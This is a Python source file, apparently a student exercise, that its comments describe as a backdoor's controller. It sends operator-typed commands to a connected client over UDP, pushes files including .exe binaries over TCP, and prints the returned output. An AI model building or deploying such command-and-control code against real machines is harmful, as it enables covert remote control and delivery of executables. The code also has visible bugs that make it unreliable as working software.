# https://docs.python.org/3/library/socket.html#socket.SOCK_DGRAM
# used this to learn how to use the socket.
# https://stackoverflow.com/questions/3283984/decode-hex-string-in-python-3
# Encoding/decoding a string to/from hex came from here.

# https://www.securecoding.com/blog/how-to-build-a-simple-backdoor-in-python/
# This file itself is an iteration on the server described here.
# https://www.w3schools.com/python/ref_file_read.asp
# File read instructions were pulled from here.

import socket
import string
from sys import getsizeof

import commands
from commands import Commands
from commands import str_to_command

buffer_size = 4096


def read_file_into_list(file, read_type):
    # https://www.w3schools.com/python/python_ref_file.asp
    # file input/management methods were referenced from here for this function.

    return_list = []
    counter = 0
    f = None

    try:
        f = open(file, read_type)

        current_input = f.read(buffer_size)
        # https://stackoverflow.com/questions/16678363/how-do-i-declare-an-empty-bytes-variable
        # used this to find the convert to byte trick.
        while current_input != b'':
            return_list.append('')
            return_list[counter] += current_input
            counter += 1
            current_input = f.read(buffer_size)

    except FileNotFoundError as e:
        print(e)
    finally:
        f.close()

    return return_list


def pull_list_from_str(input_string):
    return_list = ['']
    location = 0

    for c in input_string:
        # https://www.geeksforgeeks.org/string-whitespace-in-python/
        # Got c in string.whitespace from tutorial.
        if c in string.whitespace:
            location += 1
            return_list.append('')
        else:
            return_list[location] += c

    return return_list


def get_byte_or_char_arg_for(filename):
    # https://www.askpython.com/python/string/python-string-contains
    # String contains
    return 'b' if str.__contains__(filename, ".exe") else ''

HOST = 'localhost'
PORT = 4444
TCP_PORT = 4450

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind((HOST, PORT))
print('[+] Server Started')

try:
    while True:
        print('[+] Listening For Client Message ...')
        message_bytes, client_addr = s.recvfrom(buffer_size)
        # https://theprogrammingexpert.com/python-int-to-bytes/
        # bytes to int.
        # https://codeblessu.com/python/size-of-data-types.html
        # getsizeof
        message = commands.from_byte(message_bytes)

        if message == Commands.REQUEST:
            print(f'[+] {client_addr} Client requested a command from the server')
            command_list = pull_list_from_str(input('Enter Command : '))

            if len(command_list) >= 1:
                s.sendto(command_list[0].encode(), client_addr)

                if str_to_command(command_list[0]) == Commands.FILE and len(command_list) >= 3:
                    print("File command detected")
                    tcp_socket = socket.socket()
                    tcp_socket.bind(('', TCP_PORT))
                    tcp_socket.listen(1)
                    tcp_client, tcp_address = tcp_socket.accept()
                    byte_or_char_arg = get_byte_or_char_arg_for(command_list[1])

                    buffer_list = read_file_into_list(command_list[1], 'r{0}'.format(byte_or_char_arg))
                    s.sendto(command_list[2].encode(), client_addr)
                    # might need to change response if tcp address is something else.

                    for list_item in buffer_list:
                        tcp_client.send(list_item)

                    tcp_client.send(message.to_bytes(Commands.END_TRANSFER))
                else:
                    print("Not a file command")

            else:
                print('Could not interpret command.')

            print('[+] Command sent')
            output = s.recv(buffer_size)
            output = output.decode()
            print(f"Output: {output}")

        elif message == 'FILE':
            print('Request for file.')
        elif message == 'NAME':
            print('Request for filename.')
        else:
            print('received invalid request')

# Error types were looked up using pycharm autocomplete function.
except ConnectionAbortedError:
    print('Client ended connection')
except KeyboardInterrupt:
    print('Terminated session.')
finally:
    s.close()

